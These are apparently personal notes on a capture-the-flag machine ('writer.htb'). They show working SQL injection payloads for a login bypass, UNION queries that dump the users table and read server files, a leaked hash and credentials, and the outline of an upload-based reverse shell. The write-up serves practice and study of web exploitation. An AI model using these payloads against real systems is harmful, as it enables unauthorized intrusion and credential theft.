## Initial injection for login
Doing a directory fuzz on the homepage of the webserver reveals a /administrative page
![[Pasted image 20210809162332.png]]
After playing around with the request a bit in burpsuite, it is possible to login with a simple sql injection
```sql
uname=user'or 1 = 1 -- -&password=pass
```
![[Pasted image 20210809162609.png]]

## Union injection
Going back to the login sql injection, can use a union to execute queries on the database
```sql
uname=admin' union select "one",(select @@version),"three",":four","five","six" -- -&password=somethingthatdoesntmatter
```
![[Pasted image 20210809165644.png]]
Use this injection to leak a password hash for the admin user
```118e48794631a9612484ca8b55f622d0```
```sql
uname=admin' union select "one",(select group_concat(username,":",password,"\r\n") from writer.users),"three",":four","five","six" -- -&password=somethingthatdoesntmatter
```
![[Pasted image 20210809173242.png]]
This password doesn't appear crackable.
Use the LOAD_FILE function to read some arbitrary files -> sites-enabled 
```sql
uname=admin' union select "one",(LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf")),"three",":four","five","six" -- -&password=somethingthatdoesntmatter
```
![[Pasted image 20210809230831.png]]
After a good amount of research on the file structure of this website, get \__init\__.py from /var/www/writer/writer.htb
Among other things, this leaks database creds
![[Pasted image 20210810112559.png]]
```admin:ToughPasswordToCrack```
After an unbelievable amount of troubleshooting, managed to get a reverse shell with following commands:
-	1: Upload a file using the "filename" parameter when adding a story
	![[Pasted image 20210810164538.png]]
	- Need to use base64 because sending a cleartext slash (/) causes a server error
-	2: Once the file is uploaded, load the file using the "image_url" param of the same request
	![[Pasted image 20210810164750.png]]
	- Need to use file://absolute_path, trying to remotely download the file doesnt' work because the script saves it as a tmp file -> erases the name
-	3: Start a listener on attacking machine before hitting enter on step 2 (!!)